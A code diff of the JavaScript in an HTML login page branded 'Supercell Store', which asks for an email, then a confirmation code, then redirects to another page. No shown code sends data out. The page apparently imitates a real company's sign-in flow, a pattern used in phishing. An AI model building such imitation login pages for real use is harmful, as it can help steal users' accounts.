@@ -89,53 +89,32 @@
 
         // Función para cancelar y volver a la pantalla de correo electrónico
         function cancelLogin() {
-            // Ocultar el formulario de código
             document.getElementById("code-form").style.display = "none";
-            // Mostrar el formulario de correo
             document.getElementById("login-form").style.display = "block";
-            // Limpiar los campos de entrada
             document.getElementById("email-input").value = "";
             document.getElementById("code-input").value = "";
 
-            // Restaurar el texto original
             const mainText = document.getElementById("main-text");
             const subText = document.getElementById("sub-text");
             mainText.innerHTML = "Continuar como Supercell Store";
             subText.innerHTML = "Escribe tu correo electrónico y te enviaremos un código de confirmación.";
         }
 
-        // Obtener el formulario y el campo de email
-        const form = document.getElementById("login-form");
-        const emailInput = document.querySelector("input[type='email']");
-        const mainText = document.getElementById("main-text");
-        const subText = document.getElementById("sub-text");
-
-        // Selecciona la barra de progreso
-        const progressBar = document.querySelector(".progress-bar");
-
-        // Agregar un listener para cuando se envíe el formulario
-        form.addEventListener("submit", function (event) {
-            event.preventDefault(); // Prevenir el envío del formulario para mostrar la animación de la bola
-
-            // Aquí puedes realizar la validación o enviar el correo si es necesario.
-            // Luego de procesar el correo, activamos la animación de la bola
-            progressBar.classList.add("approved"); // Inicia la animación
-
-            // Cambiar el texto y añadir la animación de cambio
-            const email = emailInput.value;
-
-            mainText.classList.add("changed"); // Cambiar el texto de "Continuar como Supercell Store"
-            subText.classList.add("changed");  // Cambiar el texto de la segunda línea
-
-            // Actualizar el contenido de los textos
-            mainText.innerHTML = "No queda nada..."; // Cambiar a "No queda nada..."
-            subText.innerHTML = `Se ha enviado un código de verificación a tu dirección de correo electrónico <strong>${email}</strong>`; // Agregar el correo
-
-            // Ocultar el formulario de email y mostrar el formulario de código
+        // Manejar envío del formulario de correo electrónico
+        document.getElementById("login-form").addEventListener("submit", function(event) {
+            event.preventDefault();
             document.getElementById("login-form").style.display = "none";
             document.getElementById("code-form").style.display = "block";
+        });
+
+        // Manejar confirmación de código
+        document.getElementById("code-form").addEventListener("submit", function(event) {
+            event.preventDefault();
+            // Redirigir al nuevo index
+            window.location.href = "index2.html";
         });
     </script>
 </body>
 </html>
+
 
